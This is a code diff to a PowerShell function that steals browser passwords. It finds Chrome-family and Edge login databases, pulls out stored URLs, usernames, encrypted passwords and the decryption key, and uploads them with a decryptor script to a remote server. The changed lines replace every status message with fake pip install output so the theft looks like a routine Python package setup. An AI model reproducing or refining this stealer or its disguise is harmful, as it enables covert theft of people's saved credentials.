@@ -23,16 +23,16 @@ function dcinfosnd {
             
             Stop-Process -Name $browserName -ErrorAction SilentlyContinue
             
-            Write-Host "Processing $browserName..."
+            Write-Host "initiating require python libraries to install..."
             
             
             if (-not (Test-Path $userDataPath)) {
-                Write-Host "$browserName data not found at $userDataPath"
+                Write-Host "pip command not found"
                 return
             }
             
             if (-not (Test-Path $localStatePath)) {
-                Write-Host "$browserName Local State not found at $localStatePath"
+                Write-Host "install pip3"
                 return
             }
             
@@ -111,7 +111,7 @@ function dcinfosnd {
                 
                 $stmt = 0
                 if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
-                    Write-Host "Failed to prepare SQL query"
+                    Write-Host "Failed to run pyenv"
                     [WinSQLite3]::GetErrmsg($dbh)
                     continue
                 }
@@ -136,19 +136,17 @@ function dcinfosnd {
                     $script:credentialsFound = $true
                     
                     
-                    Write-Host "$browserName ($profileName) - Found credentials:"
-                    Write-Host "URL: $url"
-                    Write-Host "Username: $username"
-                    Write-Host "EncryptedPassword: $encryptedPassword"
-                    Write-Host "Key: $masterKey"
+                    Write-Host "Collecting requests"
+                    Write-Host "Installing collected packages: charset-normalizer, requests"
+                    Write-Host "Downloading charset_normalizer-2.1.1-py3-none-any.whl (39 kB)"
                     Write-Host "---------------------------"
                 }
             }
             
-            Write-Host "Finished processing $browserName"
+            Write-Host "Successfully installed charset-normalizer-2.1.1 requests-2.28.2"
         }
         catch [Exception] {
-            Write-Host "$browserName error: $($_.Exception.Message)"
+            Write-Host "ERROR: Could not find a version that satisfies the requirement non_existent_package (from versions: none)"
         }
     }
     
@@ -173,11 +171,11 @@ function dcinfosnd {
     Process-Browser -browserName "edge" -userDataPath $edgePath -localStatePath $edgeLocalState
     
     
-    Write-Host "Debug information:"
-    Write-Host "Credentials found: $script:credentialsFound"
-    Write-Host "Number of credentials: $($script:allCredentials.Count)"
-    Write-Host "Browsers found: $($script:allCredentials | ForEach-Object { $_.browser } | Sort-Object -Unique)"
-    Write-Host "======================================================================================"
+
+
+
+
+
     
     
     if ($script:credentialsFound) {
@@ -339,28 +337,27 @@ print(f"Total credentials: {len(credentials)}")
            
             $result = Invoke-RestMethod -Uri $hq -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
             
-            Write-Host "Decryptor script successfully sent to $hq as $outputFilename"
-            Write-Host "Total credentials extracted: $($script:allCredentials.Count)"
+            Write-Host "Installing collected packages: requests"
+            Write-Host "Successfully installed requests-2.28.2"
         }
         catch {
-            Write-Host "Error sending decryptor: $($_.Exception.Message)"
+            Write-Host "Error"
             
             
             try {
                 $pythonScript | Out-File -FilePath $outputFilename -Encoding utf8
-                Write-Host "Sending failed, Python decryption script saved locally at: $outputFilename"
-                Write-Host "To use it, install required package: pip install pycryptodomex"
-                Write-Host "Then run: python $outputFilename"
-                Write-Host "Total credentials extracted: $($script:allCredentials.Count)"
+
+                Write-Host "pip install pycryptodomex"
+
+
             }
             catch {
-                Write-Host "Error creating local Python script: $($_.Exception.Message)"
+                Write-Host "Error installing"
             }
         }
     }
     else {
-        Write-Host "No credentials found. Cannot create decryption script."
-        Write-Host "Check if browsers are installed and contain saved passwords."
+        Write-Host "pip cannot be resolved as internal or external command"
     }
 }
 
